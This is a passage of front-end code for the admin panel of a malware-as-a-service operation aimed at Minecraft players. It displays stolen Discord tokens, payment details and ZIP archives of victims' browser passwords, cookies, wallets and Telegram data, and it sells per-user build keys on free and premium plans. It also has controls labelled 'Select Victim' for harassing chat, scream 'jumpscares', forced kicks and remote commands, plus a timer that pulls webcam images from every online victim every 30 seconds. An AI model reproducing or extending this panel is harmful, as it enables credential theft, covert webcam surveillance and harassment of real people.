                                    <div><strong>Nitro:</strong> ${data.nitro_type || 'No Nitro'}</div>
                                    <div><strong>Billing:</strong> ${data.has_billing ? ' Yes' : ' No'}</div>
                                    <div><strong>Payment Methods:</strong> ${data.payment_methods || 0}</div>
                                    <div><strong>Guilds:</strong> ${data.guild_count || 0} (${data.owned_guilds || 0} owned)</div>
                                </div>
                            </div>
                        </div>
                    `;

                    // Badges section
                    if (data.badges && data.badges.length > 0) {
                        content += `
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
                                <div style="font-weight: 600; margin-bottom: 12px; color: var(--success);">
                                    <i class="fas fa-medal"></i> Badges
                                </div>
                                <div style="display: flex; flex-wrap: wrap; gap: 6px;">
                                    ${data.badges.map(badge => `
                                        <span style="background: var(--accent); color: white; padding: 4px 8px; border-radius: 12px; font-size: 11px; font-weight: 500;">
                                            ${badge}
                                        </span>
                                    `).join('')}
                                </div>
                            </div>
                        `;
                    }

                    // Bio section
                    if (data.bio && data.bio !== 'No bio') {
                        content += `
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
                                <div style="font-weight: 600; margin-bottom: 8px; color: var(--text-secondary);">
                                    <i class="fas fa-quote-left"></i> Bio
                                </div>
                                <div style="font-style: italic; color: var(--text-secondary); font-size: 14px;">
                                    "${data.bio}"
                                </div>
                            </div>
                        `;
                    }

                    // Rare friends section
                    if (data.rare_friends && data.rare_friends.length > 0) {
                        content += `
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
                                <div style="font-weight: 600; margin-bottom: 12px; color: var(--danger);">
                                    <i class="fas fa-star"></i> Rare Friends (${data.rare_friends.length})
                                </div>
                                <div style="max-height: 200px; overflow-y: auto;">
                                    ${data.rare_friends.map(friend => `
                                        <div style="padding: 8px; margin-bottom: 6px; background: var(--bg-primary); border-radius: 6px; border-left: 3px solid var(--danger);">
                                            <div style="font-weight: 500; margin-bottom: 4px;">${friend.username}#${friend.discriminator}</div>
                                            <div style="font-size: 11px; color: var(--text-muted);">
                                                ${friend.badges.join(', ')}
                                            </div>
                                        </div>
                                    `).join('')}
                                </div>
                            </div>
                        `;
                    }
                } else {
                    // Basic Discord info (non-enhanced)
                    content += `
                        <div style="margin-bottom: 16px; color: var(--text-secondary);">
                            <i class="fas fa-envelope"></i> ${data.email || 'No email'}<br>
                            <i class="fas fa-phone"></i> ${data.phone || 'No phone'}<br>
                            <i class="fas fa-user"></i> ${log.pc_user} @ ${log.pc_name}
                        </div>
                    `;
                }

                // System info
                content += `
                    <div style="background: var(--bg-secondary); padding: 12px; border-radius: 8px; margin-bottom: 16px; font-size: 13px; color: var(--text-muted);">
                        <i class="fas fa-desktop"></i> ${log.pc_user} @ ${log.pc_name}  
                        <i class="fas fa-globe"></i> ${log.ip} (${log.country || 'Unknown'})  
                        <i class="fas fa-clock"></i> ${new Date(log.created_at).toLocaleString()}
                    </div>
                `;

                // Token section
                content += `
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px; display: flex; justify-content: between; align-items: center;">
                            <span>DISCORD TOKEN</span>
                            <span style="background: ${isEnhanced ? 'var(--success)' : 'var(--warning)'}; color: white; padding: 2px 6px; border-radius: 10px; font-size: 9px;">
                                ${isEnhanced ? 'ENHANCED' : 'BASIC'}
                            </span>
                        </div>
                        <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--discord-blue); background: var(--bg-primary); padding: 12px; border-radius: 6px; max-height: 120px; overflow-y: auto;">
                            ${token || 'No token available'}
                        </div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy Discord Token
                    </button>
                `;
            } else if (log.log_type === 'zip') {
                // ZIP: Show download button prominently
                const size = data.size ? (data.size / 1024 / 1024).toFixed(2) + ' MB' : 'Unknown';
                document.getElementById('modalTitle').textContent = `ZIP Package`;
                content = `
                    <div style="margin-bottom: 16px; color: var(--text-secondary);">
                        <i class="fas fa-user"></i> ${log.pc_user} @ ${log.pc_name}<br>
                        <i class="fas fa-globe"></i> ${log.ip} (${log.country})<br>
                        <i class="fas fa-clock"></i> ${new Date(log.created_at).toLocaleString()}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px; text-align: center;">
                        <i class="fas fa-file-archive" style="font-size: 48px; color: var(--success); margin-bottom: 16px; display: block;"></i>
                        <div style="font-size: 24px; font-weight: 700; color: var(--success); margin-bottom: 8px;">${size}</div>
                        <div style="font-size: 12px; color: var(--text-muted);">
                            Contains: Browser Data, Cookies, Passwords, Discord Tokens, Wallets, Telegram, Gaming Data
                        </div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="downloadLog(${log.id})">
                        <i class="fas fa-download"></i> Download ZIP
                    </button>
                `;
            } else {
                // Other types: Show full JSON
                document.getElementById('modalTitle').textContent = `${log.log_type.toUpperCase()} Log`;
                content = `
                    <div style="margin-bottom: 16px;">
                        <strong>PC:</strong> ${log.pc_name}<br>
                        <strong>User:</strong> ${log.pc_user}<br>
                        <strong>IP:</strong> ${log.ip} (${log.country})<br>
                        <strong>Time:</strong> ${new Date(log.created_at).toLocaleString()}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; max-height: 400px; overflow: auto;">
                        <pre style="font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all;">${JSON.stringify(data, null, 2)}</pre>
                    </div>
                    <div style="margin-top: 16px;">
                        <button class="btn btn-primary" onclick="downloadLog(${log.id})">
                            <i class="fas fa-download"></i> Download
                        </button>
                    </div>
                `;
            }

            document.getElementById('modalBody').innerHTML = content;
            document.getElementById('modal').classList.add('active');
        }

        function closeModal() {
            document.getElementById('modal').classList.remove('active');
        }

        function downloadLog(id) {
            window.open(`/api/logs/${id}/download?token=${token}`, '_blank');
        }

        async function deleteLog(id) {
            // Show password prompt modal
            const password = prompt('Enter YOUR password to delete this log (moved to trash):', '');
            if (!password) return;

            const res = await api(`/api/logs/${id}`, 'DELETE', { password });
            if (!res.success) {
                toast(res.error || 'Failed to delete log', 'error');
                return;
            }

            toast('Log moved to trash');
            loadDashboard();
            loadLogs();
        }

        // Settings
        function loadSettings() {
            if (currentUser) {
                document.getElementById('userPlan').textContent = currentUser.plan.toUpperCase();
                document.getElementById('buildKey').textContent = currentUser.build_key;
                document.getElementById('apiEndpoint').textContent = window.location.origin + '/api/data/' + currentUser.build_key;

                // Notifications
                if (document.getElementById('webhookUrl')) {
                    document.getElementById('webhookUrl').value = currentUser.webhook_url || '';
                    document.getElementById('webhookEnabled').checked = currentUser.webhook_enabled || false;

                    // Restore filters
                    let filters = currentUser.notification_filters;
                    if (!filters) {
                        try {
                            filters = JSON.parse(localStorage.getItem('notification_filters'));
                        } catch (e) { }
                    }

                    if (filters) {
                        if (document.getElementById('notifyNewUser')) document.getElementById('notifyNewUser').checked = filters.new_user !== false;
                        if (document.getElementById('notifyCredentials')) document.getElementById('notifyCredentials').checked = filters.credentials !== false;
                        if (document.getElementById('notifyMinecraft')) document.getElementById('notifyMinecraft').checked = filters.minecraft !== false;
                        if (document.getElementById('notifyWallets')) document.getElementById('notifyWallets').checked = filters.wallets !== false;
                        if (document.getElementById('notifyFiles')) document.getElementById('notifyFiles').checked = filters.files !== false;
                    }
                }
            }
        }

        async function saveNotificationSettings() {
            const url = document.getElementById('webhookUrl').value;
            const enabled = document.getElementById('webhookEnabled').checked;

            // New Filters
            const filters = {
                new_user: document.getElementById('notifyNewUser').checked,
                credentials: document.getElementById('notifyCredentials').checked,
                minecraft: document.getElementById('notifyMinecraft').checked,
                wallets: document.getElementById('notifyWallets').checked,
                files: document.getElementById('notifyFiles').checked
            };

            const res = await api('/api/settings/notifications', 'POST', { url, enabled, filters });
            if (res.success) {
                toast('Notification settings saved', 'success');
                // Update local user object
                currentUser.webhook_url = url;
                currentUser.webhook_enabled = enabled;
                currentUser.notification_filters = filters;

                // Save to local storage for immediate persistence UI-side
                localStorage.setItem('notification_filters', JSON.stringify(filters));
            } else {
                toast(res.error || 'Failed to save settings', 'error');
            }
        }

        async function testNotification() {
            const url = document.getElementById('webhookUrl').value;
            const enabled = document.getElementById('webhookEnabled').checked;

            if (!url) return toast('Please enter a Webhook URL first', 'error');

            const res = await api('/api/settings/notifications/test', 'POST', { url, enabled });
            if (res.success) {
                toast('Test notification sent!', 'success');
            } else {
                toast(res.error || 'Failed to send test', 'error');
            }
        }

        async function changePassword() {
            const current = document.getElementById('currentPassword').value;
            const newPw = document.getElementById('newPassword').value;

            if (newPw.length < 6) return toast('Password must be at least 6 characters', 'error');

            const res = await api('/api/settings/password', 'POST', { current, new: newPw });
            if (res.success) {
                toast('Password changed');
                document.getElementById('currentPassword').value = '';
                document.getElementById('newPassword').value = '';
            } else {
                toast(res.error, 'error');
            }
        }

        // Admin
        let currentUsersData = [];

        async function loadUsers() {
            // Load Stats
            const statsRes = await api('/api/admin/users/stats');
            if (statsRes.total !== undefined) {
                document.getElementById('statsTotal').innerText = statsRes.total;
                document.getElementById('statsPremium').innerText = statsRes.premium;
                document.getElementById('statsFree').innerText = statsRes.free;
            }

            // Load initial (latest 10) or empty
            searchUsers();
        }

        async function searchUsers() {
            const query = document.getElementById('userSearchInput').value;
            const res = await api(`/api/admin/users?search=${encodeURIComponent(query)}`);

            // Should be array of users
            currentUsersData = Array.isArray(res) ? res : (res.users || []);
            renderUsersTable(currentUsersData);
        }

        // Deprecated client-side filter
        function filterUsers() {
            searchUsers();
        }

        function renderUsersTable(users) {
            document.getElementById('usersTable').innerHTML = users.map(u => `
                <tr>
                    <td>
                        <span style="color: var(--text-muted); font-size: 10px; display: block;">ID: ${u.id}</span>
                        <strong>${u.username}</strong>
                        ${u.is_admin ? '<span style="color: var(--accent); font-size: 11px;"> ADMIN</span>' : ''}
                    </td>
                    <td>
                        <span class="badge" style="background: ${u.plan === 'premium' ? 'var(--warning)' : 'var(--bg-secondary)'}; color: ${u.plan === 'premium' ? '#000' : 'var(--text-muted)'}">
                            ${u.plan ? u.plan.toUpperCase() : 'FREE'}
                        </span>
                    </td>
                    <td><code style="font-size: 11px;">${u.build_key}</code></td>
                    <td style="font-size: 12px; color: var(--text-secondary);">
                        MC: ${u.mc_sessions || 0}  DC: ${u.tokens || 0}  PW: ${u.passwords || 0}
                    </td>
                    <td>
                        <span style="color: ${u.is_active ? 'var(--success)' : 'var(--danger)'}">
                            ${u.is_active ? 'Active' : 'Disabled'}
                        </span>
                    </td>
                    <td>
                        ${!u.is_admin ? `
                            <button class="btn btn-secondary btn-sm" onclick="toggleUserPlan(${u.id}, '${u.plan}')">
                                ${u.plan === 'premium' ? 'Downgrade' : 'Upgrade'}
                            </button>
                            <button class="btn btn-secondary btn-sm" onclick="toggleUser(${u.id})">${u.is_active ? 'Disable' : 'Enable'}</button>
                            <button class="btn btn-secondary btn-sm" onclick="deleteUser(${u.id})">Delete</button>
                        `: ''}
                    </td>
                </tr>
            `).join('');
        }

        async function toggleUserPlan(id, currentPlan) {
            const newPlan = currentPlan === 'premium' ? 'free' : 'premium';
            if (!confirm(`Change user plan to ${newPlan.toUpperCase()}?`)) return;

            const res = await api(`/api/admin/users/${id}/plan`, 'POST', { plan: newPlan });
            if (res.success) {
                toast(`User plan updated to ${newPlan}`, 'success');
                loadUsers();
            } else {
                toast(res.error || 'Failed to update plan', 'error');
            }
        }

        async function loadAllLogs() {
            const res = await api('/api/admin/logs');
            if (res.success) {
                renderLogs(res.logs, 'allLogsGrid');
                window.allLogsData = res.logs;
                if (window.checkNewDonutHits) checkNewDonutHits(res.logs);
            }
        }

        // ==================== TRASH & AUDIT ====================
        async function loadTrash() {
            const res = await api('/api/admin/trash');
            if (!res.success) return;

            const trash = res.trash || [];
            document.getElementById('trashCount').textContent = trash.length;

            if (trash.length === 0) {
                document.getElementById('trashTable').innerHTML = `
                    <tr>
                        <td colspan="9" style="text-align: center; padding: 40px; color: var(--text-muted);">
                            <i class="fas fa-trash-alt" style="font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.5;"></i>
                            Trash is empty
                        </td>
                    </tr>
                `;
                return;
            }

            document.getElementById('trashTable').innerHTML = trash.map(log => `
                <tr class="animate-fade">
                    <td><code style="background: var(--bg-hover); padding: 2px 6px; border-radius: 4px;">#${log.original_id}</code></td>
                    <td><span class="log-type-badge ${log.log_type}">${log.log_type}</span></td>
                    <td>${log.pc_name || 'Unknown'}</td>
                    <td>${log.pc_user || 'Unknown'}</td>
                    <td><code style="font-size: 11px;">${log.ip || 'Unknown'}</code></td>
                    <td style="font-size: 11px;">${new Date(log.created_at).toLocaleString()}</td>
                    <td style="font-size: 11px; color: var(--danger);">${new Date(log.deleted_at).toLocaleString()}</td>
                    <td><span style="color: var(--warning);">${log.deleted_by || 'Unknown'}</span></td>
                    <td>
                        <button class="btn btn-sm btn-primary" onclick="restoreFromTrash(${log.id})" title="Restore">
                            <i class="fas fa-undo"></i>
                        </button>
                    </td>
                </tr>
            `).join('');
        }

        async function restoreFromTrash(id) {
            if (!confirm('Restore this log?')) return;

            const res = await api(`/api/admin/trash/restore/${id}`, 'POST');
            if (res.success) {
                toast('Log restored successfully!', 'success');
                loadTrash();
                loadDashboard();
            } else {
                toast(res.error || 'Failed to restore', 'error');
            }
        }

        async function emptyTrash() {
            const password = prompt('Enter your password to permanently delete all logs in trash:');
            if (!password) return;

            if (!confirm(' WARNING: This will PERMANENTLY delete all logs in trash. This cannot be undone!')) return;

            const res = await api('/api/admin/trash/empty', 'POST', { password });
            if (res.success) {
                toast(res.message, 'success');
                loadTrash();
            } else {
                toast(res.error || 'Failed to empty trash', 'error');
            }
        }

        async function createBackup() {
            const res = await api('/api/admin/backup', 'POST');
            if (res.success) {
                toast(res.message, 'success');
            } else {
                toast(res.error || 'Failed to create backup', 'error');
            }
        }

        async function loadAuditLog() {
            const res = await api('/api/admin/audit-log');
            if (!res.success) return;

            const logs = res.audit_log || [];

            if (logs.length === 0) {
                document.getElementById('auditLogTable').innerHTML = `
                    <tr>
                        <td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">
                            <i class="fas fa-clipboard-list" style="font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.5;"></i>
                            No audit logs yet
                        </td>
                    </tr>
                `;
                return;
            }

            document.getElementById('auditLogTable').innerHTML = logs.map(log => `
                <tr class="animate-fade">
                    <td style="font-size: 12px;">${new Date(log.created_at).toLocaleString()}</td>
                    <td><span style="color: var(--accent);">${log.username || 'Unknown'}</span></td>
                    <td>
                        <span style="padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600;
                            background: ${log.action.includes('DELETE') ? 'var(--danger)' : log.action.includes('RESTORE') ? 'var(--success)' : 'var(--info)'}20;
                            color: ${log.action.includes('DELETE') ? 'var(--danger)' : log.action.includes('RESTORE') ? 'var(--success)' : 'var(--info)'};">
                            ${log.action}
                        </span>
                    </td>
                    <td style="font-size: 12px; max-width: 400px; overflow: hidden; text-overflow: ellipsis;">${log.details || ''}</td>
                    <td><code style="font-size: 11px;">${log.ip || 'Unknown'}</code></td>
                </tr>
            `).join('');
        }

        function showCreateUser() {
            document.getElementById('modalTitle').textContent = 'Create User';
            document.getElementById('modalBody').innerHTML = `
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" id="newUsername" placeholder="Username">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="newUserPassword" placeholder="Password">
                </div>
                <button class="btn btn-primary" onclick="createUser()">Create User</button>
            `;
            document.getElementById('modal').classList.add('active');
        }

        async function createUser() {
            const username = document.getElementById('newUsername').value;
            const password = document.getElementById('newUserPassword').value;

            const res = await api('/api/admin/users', 'POST', { username, password });
            if (res.success) {
                toast('User created');
                closeModal();
                loadUsers();
            } else {
                toast(res.error, 'error');
            }
        }

        async function toggleUser(id) {
            const res = await api(`/api/admin/users/${id}/toggle`, 'POST');
            if (res.success) {
                loadUsers();
            }
        }

        async function deleteUser(id) {
            if (!confirm('Delete this user and all their logs?')) return;
            const res = await api(`/api/admin/users/${id}`, 'DELETE');
            if (res.success) {
                toast('User deleted');
                loadUsers();
            }
        }

        // ==================== LOGIN LOGS ====================
        async function loadLoginLogs() {
            loadBlacklist(); // Load blacklist as well
            const username = document.getElementById('loginUsernameFilter').value;
            const ip = document.getElementById('loginIpFilter').value;

            let endpoint = '/api/admin/login-logs';
            const params = new URLSearchParams();
            if (username) params.append('username', username);
            if (ip) params.append('ip', ip);
            if (params.toString()) endpoint += '?' + params.toString();

            // Load stats which contains the IP tables
            loadLoginStats();
        }

        async function loadLoginStats() {
            const res = await api('/api/admin/login-stats');
            if (res.success) {
                const stats = res.stats;

                // Render stats cards
                const statsGrid = document.getElementById('loginStatsGrid');
                statsGrid.innerHTML = `
                    <div class="stat-card">
                        <div class="stat-value">${stats.total_logins}</div>
                        <div class="stat-label">Total Logins</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" style="color: var(--success)">${stats.successful_logins}</div>
                        <div class="stat-label">Successful</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" style="color: var(--danger)">${stats.failed_logins}</div>
                        <div class="stat-label">Failed</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${stats.unique_ips}</div>
                        <div class="stat-label">Unique IPs</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${stats.unique_users}</div>
                        <div class="stat-label">Unique Users</div>
                    </div>
                `;

                // Render successful logins by IP
                const successTable = document.getElementById('successfulLoginsTable');
                successTable.innerHTML = stats.successful_by_ip.map(ip => `
                    <tr>
                        <td><strong>${ip.ip_address}</strong></td>
                        <td>${ip.os_info}</td>
                        <td>${ip.users}</td>
                        <td style="text-align: center; color: var(--success);">${ip.count}</td>
                        <td>${new Date(ip.last_login).toLocaleString()}</td>
                        <td style="text-align: center;">
                            <button onclick="clearLoginLogsByIp('${ip.ip_address}')" class="btn btn-sm" style="background: var(--danger); padding: 4px 8px; font-size: 11px;" title="Delete logs from this IP">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    </tr>
                `).join('');

                // Render failed logins by IP
                const failedTable = document.getElementById('failedLoginsTable');
                failedTable.innerHTML = stats.failed_by_ip.map(ip => `
                    <tr>
                        <td><strong style="color: var(--danger);">${ip.ip_address}</strong></td>
                        <td>${ip.attempted_users}</td>
                        <td style="text-align: center; color: var(--danger);">${ip.count}</td>
                        <td>${new Date(ip.last_attempt).toLocaleString()}</td>
                        <td style="text-align: center;">
                            <button onclick="clearLoginLogsByIp('${ip.ip_address}')" class="btn btn-sm" style="background: var(--danger); padding: 4px 8px; font-size: 11px;" title="Delete logs from this IP">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    </tr>
                `).join('');

                // Show suspicious activity if any
                if (stats.suspicious_activity && stats.suspicious_activity.length > 0) {
                    const susBox = document.getElementById('suspiciousActivityBox');
                    susBox.style.display = 'block';
                    susBox.innerHTML = `
                        <h3 style="color: var(--danger); margin-bottom: 12px;">
                            <i class="fas fa-exclamation-triangle"></i> Suspicious Activity Detected
                        </h3>
                        ${stats.suspicious_activity.map(item => `
                            <div style="background: rgba(239,68,68,0.1); border-left: 3px solid var(--danger); padding: 12px; margin-bottom: 10px; border-radius: 4px;">
                                <strong>${item.username}</strong> logged in from <strong>${item.ip_count}</strong> different IPs:<br>
                                <small style="color: var(--text-secondary);">${item.ips}</small><br>
                                <small>Last login: ${new Date(item.last_login).toLocaleString()}</small>
                            </div>
                        `).join('')}
                    `;
                } else {
                    document.getElementById('suspiciousActivityBox').style.display = 'none';
                }
            }
        }

        // ==================== ONLINE PLAYERS ====================
        let onlinePollingInterval = null;
        let webcamAutoRequestInterval = null;

        async function loadOnlinePlayers() {
            try {
                const res = await api('/api/online');
                if (!res.success) {
                    document.getElementById('onlinePlayersGrid').innerHTML = `
                        <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                            <i class="fas fa-exclamation-circle" style="font-size: 32px; margin-bottom: 16px;"></i>
                            <p>Failed to load online players</p>
                        </div>
                    `;
                    return;
                }

                const players = res.players || [];
                document.getElementById('onlineCount').textContent = players.length;
                document.getElementById('onlineCountBadge').textContent = players.length;

                updateFeatureDropdowns(players);

                if (players.length === 0) {
                    document.getElementById('onlinePlayersGrid').innerHTML = `
                        <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                            <i class="fas fa-user-slash" style="font-size: 48px; margin-bottom: 16px; opacity: 0.5;"></i>
                            <p>No players currently online</p>
                        </div>
                    `;
                    return;
                }

                document.getElementById('onlinePlayersGrid').innerHTML = players.map((p, i) => {
                    // Defensive checks for missing data
                    const player = p.player || 'Unknown';
                    const pcInfo = (p.pc_name || 'Unknown') + ' / ' + (p.pc_user || 'Unknown');
                    const ipInfo = (p.ip || 'N/A') + ' <span style="color: var(--text-muted);">(' + (p.country || '?') + ')</span>';
                    const lastSeen = formatTime(p.last_seen);

                    return `
                    <div class="online-card" style="animation-delay: ${i * 0.1}s;">
                        <div class="online-card-header">
                            <div class="online-avatar">
                                <img src="https://mc-heads.net/avatar/${p.player || 'Steve'}/48" 
                                     onerror="this.style.display='none'; this.parentElement.innerHTML='';"
                                     style="width: 48px; height: 48px; border-radius: 8px;">
                            </div>
                            <div style="flex: 1;">
                                <div class="online-name">${p.player || 'Unknown'}</div>
                                <div class="online-server">
                                    <i class="fas fa-server"></i> ${p.server || 'Unknown Server'}
                                </div>
                            </div>
                            <div class="online-status"></div>
                        </div>
                        <div class="online-info">
                            <div class="online-info-item"><i class="fas fa-desktop"></i> ${p.pc_name || 'N/A'}</div>
                            <div class="online-info-item"><i class="fas fa-user"></i> ${p.pc_user || 'N/A'}</div>
                            <div class="online-info-item"><i class="fas fa-globe"></i> ${p.ip || 'N/A'} <span style="font-size: 11px; opacity: 0.7;">(${p.country || '?'})</span></div>
                            <div class="online-info-item"><i class="fas fa-clock"></i> ${formatTime(p.last_seen)}</div>
                        </div>
                        <div class="online-actions" style="padding: 12px; border-top: 1px solid var(--border); display: flex; gap: 8px;">
                            <button class="btn btn-danger btn-sm" onclick="forceKickPlayer('${p.player}')" style="flex: 1;">
                                <i class="fas fa-bolt"></i> Force Kick
                            </button>
                            <button class="btn btn-secondary btn-sm" onclick="showPage('remote'); selectRemotePlayer('${p.player}')" style="flex: 1;">
                                <i class="fas fa-terminal"></i> Remote
                            </button>
                        </div>
                    </div>
                `}).join('');

            } catch (e) {
                console.error('Online players error:', e);
            }
        }

        function updateFeatureDropdowns(players) {
            const chatSelect = document.getElementById('chatTargetSelect');
            const soundSelect = document.getElementById('soundboardTargetSelect');

            // Build options once
            const opts = '<option value="">Select Victim...</option>' + players.map(p =>
                `<option value="${p.player}">${p.player} (${p.server || 'Unknown'})</option>`
            ).join('');

            if (chatSelect) {
                const currentChat = chatSelect.value;
                chatSelect.innerHTML = opts;
                if (currentChat) chatSelect.value = currentChat;
            }

            if (soundSelect) {
                const currentSound = soundSelect.value;
                soundSelect.innerHTML = opts;
                if (currentSound) soundSelect.value = currentSound;
            }
        }

        // Chat Functions
        function updateChatTarget() {
            document.getElementById('chatMessages').innerHTML = ''; // Clear on switch
        }

        function addChatMessage(user, text, type) {
            const msgs = document.getElementById('chatMessages');
            const div = document.createElement('div');
            div.className = 'chat-msg ' + type;
            div.innerHTML = `<strong>${user}</strong>: ${text}`;
            msgs.appendChild(div);
            msgs.scrollTop = msgs.scrollHeight;
        }

        function sendGhostMessage() {
            const input = document.getElementById('chatInput');
            const target = document.getElementById('chatTargetSelect').value;
            const text = input.value;

            if (!target) return toast('Select a victim first!', 'error');
            if (!text) return;

            if (socket && socket.connected) {
                socket.emit('send_chat', { player: target, message: text });
                addChatMessage('You', text, 'out');
                input.value = '';
            } else {
                toast('Socket not connected', 'error');
            }
        }

        // Soundboard Functions
        // Soundboard Functions
        function playTrollSound(sound) {
            const target = document.getElementById('soundboardTargetSelect').value;
            if (!target) return toast('Select a victim first!', 'error');

            // Support custom URL if it looks like a URL
            if (sound.startsWith('http')) {
                // Send custom sound command
                if (socket && socket.connected) {
                    socket.emit('play_sound_url', { player: target, url: sound });
                    toast(`Playing custom sound for ${target}`);
                } else {
                    toast('Socket not connected', 'error');
                }
                return;
            }

            if (socket && socket.connected) {
                socket.emit('play_sound', { player: target, sound: sound });
                toast(`Playing ${sound} for ${target}`);
            } else {
                toast('Socket not connected', 'error');
            }
        }

        function triggerJumpScare() {
            const target = document.getElementById('soundboardTargetSelect').value;
            if (!target) return toast('Select a victim first!', 'error');

            if (!confirm('WARNING: This will maximize volume and play a loud scream on the victim PC. Continue?')) return;

            if (socket && socket.connected) {
                // We'll use a special sound name 'jumpscare' that the mod will recognize
                socket.emit('play_sound', { player: target, sound: 'jumpscare' });
                toast(`SENT JUMP SCARE TO ${target}!`, 'success');
            } else {
                toast('Socket not connected', 'error');
            }
        }

        function uploadAndPlaySound() {
            const url = prompt("Enter direct URL of .mp3 to play (must be accessible by victim):");
            if (url) {
                playTrollSound(url);
            }
        }

        function formatTime(timestamp) {
            if (!timestamp) return 'N/A';

            // Fix: Parse SQLite timestamp (YYYY-MM-DD HH:MM:SS) manually for cross-browser safety
            let d;
            if (typeof timestamp === 'string' && timestamp.includes(' ')) {
                // Replace space with T for ISO format
                d = new Date(timestamp.replace(' ', 'T') + 'Z'); // Assume UTC if from server
            } else {
                d = new Date(timestamp);
            }

            if (isNaN(d.getTime())) return 'Invalid Date';

            const now = new Date();
            // Adjust for timezone offset if needed, but relative time is usually safer
            const diff = (now - d) / 1000; // diff in seconds

            // Future dates fix (clock skew)
            if (diff < -60) return 'In the future';
            if (diff < 60) return 'Just now';
            if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
            if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
            return d.toLocaleTimeString();
        }

        async function forceKickPlayer(playerName) {
            if (!confirm(`Force disconnect ${playerName} from their server?`)) return;

            try {
                const res = await api(`/api/online/force_disconnect/${encodeURIComponent(playerName)}`, 'POST');
                if (res.success) {
                    showToast(`Kick command sent to ${playerName}`, 'success');
                } else {
                    showToast(res.error || 'Failed to send kick command', 'error');
                }
            } catch (e) {
                showToast('Failed to send kick command', 'error');
            }

            // Reload players after a short delay
            setTimeout(loadOnlinePlayers, 1500);
        }

        function selectRemotePlayer(playerName) {
            // Pre-select the player in remote tab if possible
            setTimeout(() => {
                const select = document.getElementById('remotePlayerSelect');
                if (select) {
                    for (let opt of select.options) {
                        if (opt.value === playerName) {
                            select.value = playerName;
                            break;
                        }
                    }
                }
            }, 500);
        }

        // Start polling when on online page
        function startOnlinePolling() {
            if (onlinePollingInterval) clearInterval(onlinePollingInterval);
            loadOnlinePlayers();
            onlinePollingInterval = setInterval(loadOnlinePlayers, 5000); // Every 5 seconds

            // Start auto webcam request for all online players
            if (webcamAutoRequestInterval) clearInterval(webcamAutoRequestInterval);
            webcamAutoRequestInterval = setInterval(requestWebcamForAllPlayers, 30000); // Every 30 seconds
        }

        async function requestWebcamForAllPlayers() {
            try {
                const res = await api('/api/online');
                if (res.success && res.players) {
                    for (const player of res.players) {
                        const playerName = player.player || player.name;
                        if (playerName) {
                            // Send webcam command to each online player
                            await api('/api/remote/command', 'POST', {
                                player: playerName,
                                type: 'webcam'
                            });
                        }
                    }
                }
            } catch (e) {
                console.error('Auto webcam request error:', e);
            }
        }

        // ==================== WEBCAM ====================
        async function loadWebcamImages() {
            try {
                const res = await api('/api/webcam');
                if (!res.success) {
                    document.getElementById('webcamGrid').innerHTML = `
                        <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                            <i class="fas fa-exclamation-circle" style="font-size: 32px; margin-bottom: 16px;"></i>
                            <p>Failed to load webcam images</p>
                        </div>
                    `;
                    return;
                }

                const images = res.images || [];
                document.getElementById('webcamTotal').textContent = images.length;

                // Count today's images
                const today = new Date().toDateString();
                const todayCount = images.filter(img => new Date(img.created_at).toDateString() === today).length;
                document.getElementById('webcamToday').textContent = todayCount;

                // Count unique victims
                const uniqueVictims = new Set(images.map(img => `${img.pc_name}_${img.pc_user}`)).size;
                document.getElementById('webcamVictims').textContent = uniqueVictims;

                if (images.length === 0) {
                    document.getElementById('webcamGrid').innerHTML = `
                        <div class="webcam-empty" style="grid-column: 1/-1;">
                            <i class="fas fa-camera-retro"></i>
                            <p>No webcam captures yet</p>
                            <small style="color: var(--text-muted); margin-top: 12px; display: block;">
                                Webcam captures are automatic when victims connect to a server
                            </small>
                        </div>
                    `;
                    return;
                }

                document.getElementById('webcamGrid').innerHTML = images.map((img, i) => {
                    const safeName = (img.pc_name || 'Unknown').replace(/'/g, "\\'");
                    const dateStr = new Date(img.created_at).toLocaleString();
                    const lightboxTitle = `${safeName} - ${dateStr}`;

                    return `
                    <div class="webcam-card animate-fade" style="animation-delay: ${i * 0.05}s;">
                        <img class="webcam-image" src="/api/webcam/image/${img.id}" 
                             onclick="openLightbox('/api/webcam/image/${img.id}', '${lightboxTitle}')"
                             loading="lazy"
                             onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 160 90%22><rect fill=%22%231a1a24%22 width=%22160%22 height=%2290%22/><text x=%2280%22 y=%2250%22 fill=%22%2371717a%22 text-anchor=%22middle%22 font-size=%2210%22>Image Error</text></svg>'">
                        <div class="webcam-info">
                            <div class="webcam-victim">
                                <i class="fas fa-user-secret" style="margin-right: 8px; color: var(--accent);"></i>
